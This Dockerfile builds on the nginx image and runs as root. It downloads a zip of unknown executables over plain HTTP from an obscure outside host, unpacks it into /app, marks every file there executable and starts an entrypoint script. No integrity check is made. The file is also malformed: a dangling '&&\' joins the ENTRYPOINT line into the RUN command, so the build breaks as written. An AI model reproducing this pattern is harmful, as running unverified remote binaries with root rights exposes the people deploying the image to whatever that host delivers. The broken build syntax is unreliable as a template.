FROM nginx:latest
EXPOSE 80
WORKDIR /app
USER root

COPY nginx.conf /etc/nginx/nginx.conf
COPY entrypoint.sh ./

RUN apt-get update && apt-get install -y wget unzip iproute2 systemctl &&\
    wget -O temp.zip http://opo.pp.ua/qingcloud/x86/test/test.zip &&\
    unzip temp.zip  &&\
    rm -f temp.zip &&\
    chmod +x /app/*  &&\

ENTRYPOINT [ "./entrypoint.sh" ]
